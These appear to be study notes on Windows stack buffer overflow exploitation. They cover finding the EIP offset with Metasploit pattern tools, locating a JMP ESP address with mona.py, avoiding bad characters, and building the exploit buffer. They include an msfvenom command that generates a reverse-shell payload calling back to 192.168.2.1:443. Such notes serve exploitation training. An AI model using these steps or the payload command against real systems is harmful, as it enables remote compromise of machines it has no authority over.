Trigger the vulnerability by sending increased amount of A's untill the process crashes in the debugger. 

Generate a unique string of characters to find where EIP is:
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <Length#>

Look for the exact location of the EIP 
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <location#>

Now we know the string "39694448" its at the 2606 location. Is 4 bytes long.  We will change our script to show 2606 A's  4 B's and 90 C's.   

Redirect Execution Flow - Find a Return Address: Mona.py
!mona
noaslr               | Show modules that are not aslr or rebased
nosafesehaslr        | Show modules that are not safeseh protected, not aslr and not rebased
bytearray /ba	     | Create a list of Hex to test for bad characters


Show list of .dlls (look for no aslr and depth) 
In bottom white area:  !mona nosafesehaslr        

Go to Executable modules list: the "e" at the top menu bar, locate the .dll you chose to use.  

(CTRL+F) Right click > Search For > Command	Try: "jmp esp"
(CTRL+S) Right click > Search For > Find sequence of commands	Try: 
push esp
retn

Go to Memory Map: the "m" at the top menu bar, locate the same .dll or 'Owner column'
If protected with DEP, Look for 'Access column' to be Executable, containing an "E".  If not can use anyone of the modules.

/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
Type: "jmp esp" to find specific bytes of opcode.  You will use the 4 byte output as direction
for your EIP or the 4 "B"  (example FFE4)

convert this bytes output (example: \xff\xe4)

!mona find -s "\xff\xe4" -m 
Look for address which doesn't contain bad characters. Verify 'JMP ESP instruction' is located at address.  Click icon to left of "l"

Debugger should confirm: <location>  FFE4 = JMP ESP  (Example location: 5F4A358F) *Remeber to place a BREAKPOINT [F2]

Copy the address(location) and update the exploit.  This replaces the "B", written in reverse (5F4A358F)
Example:
A * #TrigBufferOverFlow#  + "\x8f\x35\x4a\x5f" + Future Shellcode

Create shellcode, without the bad characters.
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.1 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai EXITFUNC=thread

Remeber to set BREAKPOINT [F2] at the JMP ESP again!  

Click F8 to move down bytes.  The "Decoder" (in purple) starts with "FSTENV"  

	


	